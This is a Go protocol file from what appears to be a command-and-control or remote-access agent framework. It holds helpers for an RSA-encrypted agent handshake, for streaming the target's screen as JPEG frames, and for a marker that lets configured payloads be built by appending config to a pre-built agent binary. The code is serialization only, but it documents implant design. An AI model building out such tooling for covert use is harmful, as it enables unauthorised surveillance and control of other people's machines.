package protocol

// RCP (Remote Control Protocol) wire helpers: connection handshake and the
// binary screen-frame payload. The channel is a long-lived TCP connection that
// exists in parallel to the polling task loop, so streaming is not limited by
// the agent sleep interval.

import (
	"encoding/binary"
	"fmt"
)

// OverlayMarker separates the config appended to a pre-built agent template
// (payload generation by overlay, no recompilation). Prefixed with NUL bytes
// so it cannot collide with normal binary content; payload = <marker><b64>.
var OverlayMarker = []byte("\x00\x00WISPCFG\x00\x00")

// AgentIDSize is the fixed length of the agent identifier used in the RCP
// handshake. Agents generate an 8-byte random id (hex-encoded to 16 chars),
// so the raw byte length sent on the wire is 8.
const AgentIDSize = 8

// BuildRCPHello builds the agent → server handshake packet: agentID followed by
// the 16-byte random challenge encrypted with the server RSA public key.
func BuildRCPHello(agentID, challenge, serverPubKeyPEM []byte) (*Packet, error) {
	enc, err := RSAEncrypt(serverPubKeyPEM, challenge)
	if err != nil {
		return nil, fmt.Errorf("encrypt challenge: %w", err)
	}
	payload := make([]byte, 0, AgentIDSize+len(enc))
	payload = append(payload, agentID...)
	payload = append(payload, enc...)
	return &Packet{Type: TypeRCPHello, Payload: payload}, nil
}

// ParseRCPHello splits a Hello payload into the agent id and the RSA-encrypted
// challenge (a 2048-bit key produces 256 bytes of ciphertext).
func ParseRCPHello(payload []byte) (agentID, encChallenge []byte, err error) {
	if len(payload) < AgentIDSize+256 {
		return nil, nil, fmt.Errorf("invalid hello length: %d", len(payload))
	}
	return payload[:AgentIDSize], payload[AgentIDSize:], nil
}

// RCPFrameSize is the fixed header length of a screen frame payload.
const RCPFrameSize = 16

// EncodeRCPFrame packs a screen frame: seq(8 BE) + width(4 BE) + height(4 BE)
// followed by the raw JPEG bytes (no base64 — keeps the channel fast).
func EncodeRCPFrame(seq uint64, w, h int, jpegData []byte) []byte {
	payload := make([]byte, RCPFrameSize+len(jpegData))
	binary.BigEndian.PutUint64(payload[0:8], seq)
	binary.BigEndian.PutUint32(payload[8:12], uint32(w))
	binary.BigEndian.PutUint32(payload[12:16], uint32(h))
	copy(payload[RCPFrameSize:], jpegData)
	return payload
}

// RCPFrame is a decoded screen frame.
type RCPFrame struct {
	Seq  uint64
	W, H int
	JPEG []byte
}

// DecodeRCPFrame unpacks a screen frame payload.
func DecodeRCPFrame(payload []byte) (*RCPFrame, error) {
	if len(payload) < RCPFrameSize {
		return nil, fmt.Errorf("frame payload too short: %d", len(payload))
	}
	return &RCPFrame{
		Seq: binary.BigEndian.Uint64(payload[0:8]),
		W:   int(binary.BigEndian.Uint32(payload[8:12])),
		H:   int(binary.BigEndian.Uint32(payload[12:16])),
		JPEG: payload[RCPFrameSize:],
	}, nil
}
